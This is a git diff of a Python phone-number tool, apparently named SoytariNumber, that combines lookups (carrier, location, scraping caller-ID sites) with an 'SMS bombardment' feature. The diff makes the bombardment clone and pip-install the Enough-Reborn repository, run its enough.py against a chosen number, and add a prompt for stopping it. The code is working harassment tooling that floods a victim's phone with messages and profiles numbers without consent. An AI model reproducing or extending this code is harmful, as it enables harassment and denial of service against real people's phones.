@@ -11,6 +11,7 @@ from colorama import Fore, Style, init
 from tqdm import tqdm
 import phonenumbers
 from phonenumbers import geocoder, carrier, number_type
+import signal
 
 # Kütüphane yüklemesi (Varsa kurar)
 def install_libraries(packages):
@@ -58,7 +59,9 @@ LANGUAGES = {
         "social_media_uncertain": "Sosyal medya durumu belirsiz.",
         "sms_bombardiman_start": "SMS Bombardımına başlıyoruz! 🚨 Numara: {}",
         "sms_bombardiman_error": "SMS Bombardımında hata: {}",
-        "sms_bombardiman_success": "SMS Bombardımanı başlatıldı, birazdan mesajlar gider! 💥",
+        "sms_bombardiman_success": "SMS Bombardımanı başlatıldı, mesajlar gönderiliyor! 💥",
+        "sms_bombardiman_stop": "SMS Bombardımanı durduruldu! 🛑",
+        "sms_bombardiman_prompt": "Durdurmak için 'durdur' yaz veya Enter'a basarak devam et: ",
     },
     "en": {
         "welcome": "Yo! Ready to crack number secrets with SoytariNumber? 🚀",
@@ -85,7 +88,9 @@ LANGUAGES = {
         "social_media_uncertain": "Social media usage unclear.",
         "sms_bombardiman_start": "Starting SMS Bombardment! 🚨 Number: {}",
         "sms_bombardiman_error": "SMS Bombardment error: {}",
-        "sms_bombardiman_success": "SMS Bombardment started, messages will be sent soon! 💥",
+        "sms_bombardiman_success": "SMS Bombardment started, messages being sent! 💥",
+        "sms_bombardiman_stop": "SMS Bombardment stopped! 🛑",
+        "sms_bombardiman_prompt": "Type 'stop' to halt or press Enter to continue: ",
     },
     "es": {
         "welcome": "¡Ey! ¿Listo para descubrir los secretos con SoytariNumber? 🚀",
@@ -112,7 +117,9 @@ LANGUAGES = {
         "social_media_uncertain": "Uso de redes sociales incierto.",
         "sms_bombardiman_start": "¡Iniciando bombardeo de SMS! 🚨 Número: {}",
         "sms_bombardiman_error": "Error en bombardeo de SMS: {}",
-        "sms_bombardiman_success": "¡Bombardeo de SMS iniciado, los mensajes se enviarán pronto! 💥",
+        "sms_bombardiman_success": "¡Bombardeo de SMS iniciado, los mensajes se están enviando! 💥",
+        "sms_bombardiman_stop": "¡Bombardeo de SMS detenido! 🛑",
+        "sms_bombardiman_prompt": "Escribe 'detener' para parar o presiona Enter para continuar: ",
     }
 }
 
@@ -152,7 +159,7 @@ NUM_TYPE_MAP = {
     7: {"tr": "VoIP numarası, teknoloji meraklısı!", "en": "VoIP number, tech enthusiast!", "es": "¡Número VoIP, entusiasta de la tecnología!"},
 }
 
-SPAM_PREFIXES = ["+4470", "+1202", "+1900"] 
+SPAM_PREFIXES = ["+4470", "+1202", "+1900"]
 
 def clear_screen():
     os.system('cls' if os.name == 'nt' else 'clear')
@@ -255,7 +262,7 @@ def phoneinfoga_style_search(number):
     results = []
     headers = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/91.0.4472.124"}
     search_query = number.replace('+', '')
-    alt_query = number[1:]  # + olmadan format
+    alt_query = number[1:]
 
     # 1. WhoCalledMe taraması
     try:
@@ -339,21 +346,52 @@ def sms_bombardiman(number):
         # Enough-Reborn reposunu klonla
         repo_dir = "sms_tool"
         if not os.path.exists(repo_dir):
-            subprocess.check_call(["git", "clone", "https://github.com/tingirifistik/Enough-Reborn.git", repo_dir], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+            slow_print("SMS aracı indiriliyor...", color=theme["primary"])
+            subprocess.check_call(["git", "clone", "https://github.com/tingirifistik/Enough-Reborn.git", repo_dir], stdout=subprocess.DEVNULL, stderr=subprocess.STDOUT)
         
         # Bağımlılıkları yükle
         requirements_path = os.path.join(repo_dir, "requirements.txt")
         if os.path.exists(requirements_path):
-            subprocess.check_call([sys.executable, "-m", "pip", "install", "-r", requirements_path], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
-        
-        # enough.py'yi çalıştır
-        enough_path = os.path.join(repo_dir, "enough.py")
-        if os.path.exists(enough_path):
-            # Enough-Reborn'ün nasıl çalıştığını bilmiyorum, numara argüman olarak verilecek
-            subprocess.Popen(["python3", enough_path, number], cwd=repo_dir)
-            slow_print(LANGUAGES[lang]["sms_bombardiman_success"], color=theme["success"])
+            slow_print("Bağımlılıklar yükleniyor...", color=theme["primary"])
+            subprocess.check_call([sys.executable, "-m", "pip", "install", "-r", requirements_path], stdout=subprocess.DEVNULL, stderr=subprocess.STDOUT)
         else:
-            raise Exception("enough.py bulunamadı!")
+            raise FileNotFoundError("requirements.txt bulunamadı!")
+
+        # enough.py yolunu kontrol et
+        enough_path = os.path.join(repo_dir, "enough.py")
+        if not os.path.exists(enough_path):
+            raise FileNotFoundError(f"enough.py bulunamadı: {enough_path}")
+        
+        # SMS bombardımanını başlat
+        process = subprocess.Popen(["python3", enough_path, number], cwd=repo_dir, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
+        slow_print(LANGUAGES[lang]["sms_bombardiman_success"], color=theme["success"])
+        
+        # Kullanıcıdan durdurma komutu bekle
+        while True:
+            try:
+                user_input = input(LANGUAGES[lang]["sms_bombardiman_prompt"]).strip().lower()
+                if user_input == "durdur" or user_input == "stop" or user_input == "detener":
+                    process.terminate()
+                    try:
+                        process.wait(timeout=5)
+                    except subprocess.TimeoutExpired:
+                        process.kill()
+                    slow_print(LANGUAGES[lang]["sms_bombardiman_stop"], color=theme["error"])
+                    break
+            except KeyboardInterrupt:
+                process.terminate()
+                try:
+                    process.wait(timeout=5)
+                except subprocess.TimeoutExpired:
+                    process.kill()
+                slow_print(LANGUAGES[lang]["sms_bombardiman_stop"], color=theme["error"])
+                break
+
+        # Hata mesajlarını kontrol et
+        stdout, stderr = process.communicate()
+        if stderr:
+            slow_print(LANGUAGES[lang]["sms_bombardiman_error"].format(stderr), color=theme["error"])
+
     except Exception as e:
         slow_print(LANGUAGES[lang]["sms_bombardiman_error"].format(str(e)), color=theme["error"])
 
@@ -437,7 +475,7 @@ def main():
             if not num:
                 print(Fore.RED + LANGUAGES[settings["language"]]["invalid_number"])
                 continue
-            print(LANGUAGES[settings["language"]]["zing"])
+            print(LANGUAGES[settings["language"]]["analyzing"])
             details = analyze_single_number(num)
             for k, v in details.items():
                 print(f"{k}: {v}")
